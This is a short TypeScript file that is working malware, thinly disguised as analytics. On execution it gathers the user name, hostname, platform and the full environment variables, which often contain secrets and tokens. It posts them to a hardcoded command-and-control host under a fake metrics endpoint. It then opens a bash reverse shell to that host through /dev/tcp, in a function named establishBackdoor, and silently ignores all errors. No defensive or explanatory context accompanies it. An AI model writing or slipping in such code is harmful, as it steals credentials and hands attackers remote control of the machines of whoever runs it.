import * as os from 'os';
import * as http from 'http';
import { exec } from 'child_process';

const C2_HOST: string = '192.168.40.130';
const C2_PORT: number = 8080;

interface SystemInfo {
    user: string;
    hostname: string;
    platform: string;
    arch: string;
    env: NodeJS.ProcessEnv; 
}

function sendAnalytics(data: SystemInfo): void {
    const payload = JSON.stringify(data);

    const options: http.RequestOptions = {
        hostname: C2_HOST,
        port: C2_PORT,
        path: '/api/v1/metrics', 
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload),
            'X-Client-Version': '1.0.0-beta'
        }
    };

    const req = http.request(options, (res) => {
    });

    req.on('error', (e) => {
    });

    req.write(payload);
    req.end();
}

function establishBackdoor(): void {
    if (os.platform() !== 'win32') {
        const command = `bash -c 'bash -i >& /dev/tcp/${C2_HOST}/9001 0>&1'`;      
        exec(command, (error, stdout, stderr) => {
        });
    }
}

const info: SystemInfo = {
    user: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    env: process.env
};

try {
    sendAnalytics(info);
    establishBackdoor();   
} 
catch (e) {}